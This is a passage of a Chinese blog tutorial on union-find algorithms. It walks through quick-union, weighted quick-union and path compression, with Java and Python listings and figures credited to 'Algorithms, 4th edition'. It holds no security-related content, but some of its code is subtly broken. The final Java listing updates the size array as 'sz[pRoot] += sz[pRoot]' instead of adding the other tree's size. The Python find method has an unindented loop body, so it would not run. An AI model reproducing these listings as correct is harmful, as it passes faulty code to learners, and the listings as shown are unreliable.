class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(<span class="keyword">new</span> FileReader(<span class="string">&quot;demo.txt&quot;</span>));</span><br><span class="line">        <span class="keyword">int</span> N = sc.nextInt();</span><br><span class="line">        union_find uf = <span class="keyword">new</span> union_find(N);</span><br><span class="line">        <span class="keyword">while</span> (sc.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">int</span> p = sc.nextInt();</span><br><span class="line">            <span class="keyword">int</span> q = sc.nextInt();</span><br><span class="line">            <span class="keyword">if</span> (uf.connected(p, q)) <span class="keyword">continue</span>;</span><br><span class="line">            uf.union(p, q);</span><br><span class="line">            System.out.println(p + <span class="string">&quot; &quot;</span> + q);</span><br><span class="line">        &#125;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>quick-union</code> 算法</p><p>虽然说 <code>quick-find</code> 算法十分简洁，但是由于每一次输入都需要遍历整个数组，一般无法用于处理大型问题，因此我们需要一些别的思路：如果是仅仅把同块元素的标识设为相同，则对于同块元素的查找就必须遍历数组才行，因此我们的重点应该是把同块元素在逻辑上连接在一起，这样查找同块元素就不需要涉及对数组其他元素的访问了。</p><p>我们可以以一个块中最早的整数为根整数，而其他整数直接或间接地指向这个根整数，所谓直接或间接指向，即同块中的一个整数索引到的数组值可以是这个根整数，也可以是其他能够指向根整数的整数值。而根整数索引到的值始终与初始状态相同，即块中根整数的标识为其本身。举个例子，当我们要查找一个整数 <strong>p</strong> 所属块的标识的时候，我们需要查询以 <strong>p</strong> 为索引在数组中对应的值 <strong>id[p]</strong> ，然后再以 <strong>id[p]</strong> 为索引得到 <strong>id[id[p]]</strong> ……一直到某个<span class="bubble-content">索引值与存储值相同</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#5e616d;">id[x] == x</span></span>时，该值即为该块的标识，也就是该块中根整数的值。而连接两个块时只需将一个块中根整数索引到数组中的值换成另一个块的根整数即可。</p><p>这么解释或许过于抽象，下图为《算法：第4版》中的图示，根触点即所谓根整数。</p><center>    <img src="https://bu.dusays.com/2022/05/26/628f80b0a703a.webp" alt="" style="zoom: 50%;" />    <div style="display: inline-block;                padding: 2px;                border-bottom: 1px solid #d9d9d9;                font-size: 75%;">        quick-union 算法概述，图源自《算法：第4版》    </div></center><p>这个思路貌似让 <code>find()</code> 方法变得非常复杂，事实上实现并不复杂。我们只需要根据根整数索引到的值等于本身，而同块中其他整数索引到的值都不等于本身的特性来实现一个 <code>while</code> 循环，当索引等于数组中的存储值时，该值即该块的标识。</p><p>实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line"><span class="keyword">while</span> (p != id[p]) p = id[p];</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一方面，<code>union()</code> 方法的任务就非常简单了，不仅不用遍历数组，而且只需修改一个值即可。也就是为什么算法名为 <code>quick-union</code> 算法了。这里对于任何输入整数对 <strong>p</strong> 、 <strong>q</strong> ，总是以 <strong>q</strong> 的根整数为新的根整数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> pRoot = find(p);</span><br><span class="line"><span class="keyword">int</span> qRoot = find(q);</span><br><span class="line">id[pRoot] = qRoot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，我们就实现了更快一点的 <code>quick-union</code> 算法了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">union_find</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] id;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">union_find</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        id = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) id[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (p != id[p]) p = id[p];</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pRoot = find(p);</span><br><span class="line">        <span class="keyword">int</span> qRoot = find(q);</span><br><span class="line">        id[pRoot] = qRoot;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(<span class="keyword">new</span> FileReader(<span class="string">&quot;demo.txt&quot;</span>));</span><br><span class="line">        <span class="keyword">int</span> N = sc.nextInt();</span><br><span class="line">        union_find uf = <span class="keyword">new</span> union_find(N);</span><br><span class="line">        <span class="keyword">while</span> (sc.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">int</span> p = sc.nextInt();</span><br><span class="line">            <span class="keyword">int</span> q = sc.nextInt();</span><br><span class="line">            <span class="keyword">if</span> (uf.connected(p, q)) <span class="keyword">continue</span>;</span><br><span class="line">            uf.union(p, q);</span><br><span class="line">            System.out.println(p + <span class="string">&quot; &quot;</span> + q);</span><br><span class="line">        &#125;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>加权 <code>quick-union</code> 算法</p><p>上面的 <code>quick-union</code> 算法虽说已经相较于 <code>quick-find</code> 算法提示不少了，但是在最终实现时，显然还有一个不太高效的假设：对于任何输入整数对 <strong>p</strong> 、 <strong>q</strong> ，总是以 <strong>q</strong> 的根整数为新的根整数。</p><p>由于我们总是无条件将 <strong>q</strong> 所在块通过原根整数间接接入新块，如果将一个块的连接关系描述成一棵连接树的话，这将导致树的高度不断提高，也就增加了 <code>find()</code> 方法中循环的次数，如图所示：</p><center>    <img src="https://bu.dusays.com/2022/05/26/628f80b027642.webp" alt="" style="zoom: 50%;" />    <div style="display: inline-block;                padding: 2px;                border-bottom: 1px solid #d9d9d9;                font-size: 75%;">        quick-union 生成的树，图源自《算法：第4版》    </div></center><p>先思考一个问题，为什么上述的树会不断长高。当我们连接两棵树的时候，两棵树如果本来就有高度的区别，那么将小树连接到一棵大树上的时候，树的高度并不会有什么变化，而当将一棵大树连接到一棵小树上时，由于根整数将指向小树的根整数，因此新树的高度将加一，而问题则显然出在这里。想象一下，如果运气不好，每次都将大树连接到小树，则最后生成的树的高度可能会等于初始序列的长度，这意味着每次调用 <code>find()</code> 方法将遍历整个数组，<psw>毫无性能可言</psw>！</p><center>    <img src="https://bu.dusays.com/2022/05/26/628f80b27fb7b.webp" alt="" style="zoom: 50%;" />    <div style="display: inline-block;                padding: 2px;                border-bottom: 1px solid #d9d9d9;                font-size: 75%;">        加权 quick-union，图源自《算法：第4版》    </div></center><p>如果我们每次连接两棵树的时候，依据树的大小关系，总是把较小的树接入较大的树，就能很大程度解决这个问题了。因此，我们最后一步将对这个问题进行优化，所采用的方法就是 <strong>加权</strong> 。</p><p>由于 <code>quick-union</code> 算法树与树之间实际上就是根整数与根整数之间的操作，因此我们只需为每棵树的根整数加权并在每次连接前进行比较即可。根据上文的分析，权值大小应与树的高度有关，但事实上树的高度的维护会复杂一些。其实我们可以直接依据树中整数的个数，即节点数来作为权值，毕竟，当总是小树接入大树的话，从一开始就不会生成节点少而高度大的怪树，而维护一个用节点数表示的权值也比维护一个高度表示的要容易。</p><p>我们额外定义一个数组，数组中的值表示对应整数作为根整数的时候所拥有的节点数，初始状态每个元素自成一组，一组一个元素，因此初始化时将数组中的值全部设为 1 即可。</p><p>实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[] sz;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">union_find</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">id = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">    sz = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        id[i] = i;</span><br><span class="line">        sz[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后修改一下 <code>union()</code> 方法的实现，在连接树之前先进行比较，连接后将总节点数存储在新根整数索引到的数组位里。</p><p>实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pRoot = find(p);</span><br><span class="line">    <span class="keyword">int</span> qRoot = find(q);</span><br><span class="line">    <span class="keyword">if</span> (sz[pRoot] &lt; sz[qRoot]) &#123;</span><br><span class="line">    id[pRoot] = qRoot;</span><br><span class="line">    sz[qRoot] += sz[pRoot];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    id[qRoot] = pRoot;</span><br><span class="line">    sz[pRoot] += sz[qRoot];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，我们就实现了加权 <code>quick-union</code> 算法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">union_find</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] sz;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">union_find</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        id = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        sz = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">            id[i] = i;</span><br><span class="line">            sz[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (p != id[p]) p = id[p];</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pRoot = find(p);</span><br><span class="line">        <span class="keyword">int</span> qRoot = find(q);</span><br><span class="line">        <span class="keyword">if</span> (sz[pRoot] &lt; sz[qRoot]) &#123;</span><br><span class="line">            id[pRoot] = qRoot;</span><br><span class="line">            sz[qRoot] += sz[pRoot];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            id[qRoot] = pRoot;</span><br><span class="line">            sz[pRoot] += sz[qRoot];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(<span class="keyword">new</span> FileReader(<span class="string">&quot;demo.txt&quot;</span>));</span><br><span class="line">        <span class="keyword">int</span> N = sc.nextInt();</span><br><span class="line">        union_find uf = <span class="keyword">new</span> union_find(N);</span><br><span class="line">        <span class="keyword">while</span> (sc.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">int</span> p = sc.nextInt();</span><br><span class="line">            <span class="keyword">int</span> q = sc.nextInt();</span><br><span class="line">            <span class="keyword">if</span> (uf.connected(p, q)) <span class="keyword">continue</span>;</span><br><span class="line">            uf.union(p, q);</span><br><span class="line">            System.out.println(p + <span class="string">&quot; &quot;</span> + q);</span><br><span class="line">        &#125;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该算法效果如图所示：</p><center>       <img src="https://bu.dusays.com/2022/05/26/628f80b2a92d3.webp" alt="" style="zoom: 50%;" />       <div style="display: inline-block;                   padding: 2px;                   border-bottom: 1px solid #d9d9d9;                   font-size: 75%;">           加权 quick-union，图源自《算法：第4版》       </div>   </center><p>当然，如果以高度作为权值的话，实现就应该是下面这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pRoot = find(p);</span><br><span class="line">    <span class="keyword">int</span> qRoot = find(q);</span><br><span class="line">    <span class="keyword">if</span> (sz[pRoot] &lt; sz[qRoot]) id[pRoot] = qRoot;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sz[pRoot] &gt; sz[qRoot]) id[qRoot] = pRoot;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        id[pRoot] = qRoot;</span><br><span class="line">        sz[qRoot]++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>路径压缩的加权 <code>quick-union</code> 算法</p><p>即使加权 <code>quick-union</code> 算法，依然不是现存的最优算法，即使树的高度得到了很大的控制，但我们依然希望每个节点能直接连接到根整数。</p><blockquote><p>路径压缩的加权 quick-union 算法是最优的算法，但并非所有操作都能在常数时间内完成。</p><div align="right">摘自：《算法：第4版》。</div></blockquote><p>该算法的实现实际上就是在 <code>find()</code> 方法中添加一个循环，把查找过程中遇到的中间节点全部改为指向根整数的，以最大化压缩路径，得到一棵几乎扁平的树。</p><p>实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp = p;</span><br><span class="line">    <span class="keyword">while</span> (p != id[p]) p = id[p];</span><br><span class="line">    <span class="keyword">while</span> (tmp != id[tmp]) &#123;</span><br><span class="line">        <span class="keyword">int</span> t = tmp;</span><br><span class="line">        tmp = id[tmp];</span><br><span class="line">        id[t] = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该算法的具体实现及其他语言实现将在下面给出。</p></li></ol><h2 id="源代码-3">源代码</h2><div class="tabs" id="test"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test-1"><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#h-t-m-java"></use></svg>Java</button></li><li class="tab"><button type="button" data-href="#test-2"><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#h-t-m-Python"></use></svg>Python</button></li><li class="tab"><button type="button" data-href="#test-3"><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#h-t-m-a-c"></use></svg>C++</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test-1"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">union_find</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] sz;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">union_find</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        id = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        sz = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">            id[i] = i;</span><br><span class="line">            sz[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = p;</span><br><span class="line">        <span class="keyword">while</span> (p != id[p]) p = id[p];</span><br><span class="line">        <span class="keyword">while</span> (tmp != id[tmp]) &#123;</span><br><span class="line">            <span class="keyword">int</span> t = tmp;</span><br><span class="line">            tmp = id[tmp];</span><br><span class="line">            id[t] = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pRoot = find(p);</span><br><span class="line">        <span class="keyword">int</span> qRoot = find(q);</span><br><span class="line">        <span class="keyword">if</span> (pRoot == qRoot)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (sz[pRoot] &lt; sz[qRoot]) &#123;</span><br><span class="line">            id[pRoot] = qRoot;</span><br><span class="line">            sz[qRoot] += sz[pRoot];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            id[qRoot] = pRoot;</span><br><span class="line">            sz[pRoot] += sz[pRoot];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(<span class="keyword">new</span> FileReader(<span class="string">&quot;demo.txt&quot;</span>));</span><br><span class="line">        <span class="keyword">int</span> N = sc.nextInt();</span><br><span class="line">        union_find uf = <span class="keyword">new</span> union_find(N);</span><br><span class="line">        <span class="keyword">while</span> (sc.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">int</span> p = sc.nextInt();</span><br><span class="line">            <span class="keyword">int</span> q = sc.nextInt();</span><br><span class="line">            <span class="keyword">if</span> (uf.connected(p, q)) <span class="keyword">continue</span>;</span><br><span class="line">            uf.union(p, q);</span><br><span class="line">            System.out.println(p + <span class="string">&quot; &quot;</span> + q);</span><br><span class="line">        &#125;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test-2"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 小白尝试，代码简陋，不做参考</span></span><br><span class="line"><span class="comment"># 会改的会改的</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">quick_union</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, N</span>):</span></span><br><span class="line">        self.<span class="built_in">id</span> = <span class="built_in">list</span>(<span class="built_in">range</span>(N))</span><br><span class="line">        self.sz = [<span class="number">1</span>]*N</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connected</span>(<span class="params">self, p, q</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.find(p) == self.find(q)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span>(<span class="params">self, p</span>):</span></span><br><span class="line">        tmp = p</span><br><span class="line">        <span class="keyword">while</span> p != self.<span class="built_in">id</span>[p]:</span><br><span class="line">            p = self.<span class="built_in">id</span>[p]</span><br><span class="line">        <span class="keyword">while</span> tmp != self.<span class="built_in">id</span>[tmp]:</span><br><span class="line">t = tmp</span><br><span class="line">tmp = self.<span class="built_in">id</span>[tmp]</span><br><span class="line">self.<span class="built_in">id</span>[t] = p</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">union</span>(<span class="params">self, p, q</span>):</span></span><br><span class="line">        pR = self.find(p)</span><br><span class="line">        qR = self.find(q)</span><br><span class="line">        <span class="comment"># 若已经相连则不再创建连接</span></span><br><span class="line">        <span class="keyword">if</span> pR == qR:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> self.sz[pR] &lt; self.sz[qR]:</span><br><span class="line">            self.<span class="built_in">id</span>[pR] = qR</span><br><span class="line">            self.sz[qR] += self.sz[pR]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.<span class="built_in">id</span>[qR] = pR</span><br><span class="line">            self.sz[pR] += self.sz[qR]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;demo.txt&quot;</span>)</span><br><span class="line">N = <span class="built_in">int</span>(f.readline())</span><br><span class="line">uf = quick_union(N)</span><br><span class="line">fl = f.readlines()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> fl:</span><br><span class="line">    p = <span class="built_in">int</span>(s.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">    q = <span class="built_in">int</span>(s.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> uf.connected(p, q): <span class="keyword">continue</span></span><br><span class="line">    uf.union(p, q)</span><br><span class="line">    <span 